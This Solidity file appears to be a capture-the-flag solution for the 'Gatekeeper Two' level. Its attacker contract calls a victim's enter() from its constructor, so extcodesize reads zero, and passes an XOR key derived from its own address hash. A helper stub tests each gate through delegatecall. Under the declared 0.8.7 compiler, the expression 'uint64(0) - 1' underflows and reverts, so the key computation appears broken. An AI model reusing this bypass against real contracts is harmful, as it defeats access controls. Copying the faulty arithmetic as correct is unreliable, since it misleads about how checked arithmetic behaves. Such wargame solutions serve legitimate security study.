// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract GatekeeperTwoStub {
  event SecondGate(uint call);
  event ThirdGate(bool result);

  function testSecond() public {
      uint x;
      assembly { x := extcodesize(caller()) }
      emit SecondGate(x);
  }

  function testThird(bytes8 _key) public {
      bool result = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_key) == uint64(0) - 1;
      emit ThirdGate(result);
  }
}

interface Gatekeeper {
    function enter(bytes8 key) external;
}

contract GatekeeperTwo {
  event SecondGate(uint call);
  event ThirdGate(bool result);

  constructor(address victim) {
    Gatekeeper level = Gatekeeper(victim);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    level.enter(key);  
  }

  function testSecondGate(address stub) public returns (bool) {
    (bool success,) = address(stub).delegatecall(abi.encodeWithSignature("testSecond()"));
    return success;
  }
  
  function testThird(address stub) public returns (bool) {
    bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    (bool success,) = address(stub).delegatecall(abi.encodeWithSignature("testThird(bytes8)", _key));
    return success;
  }
}
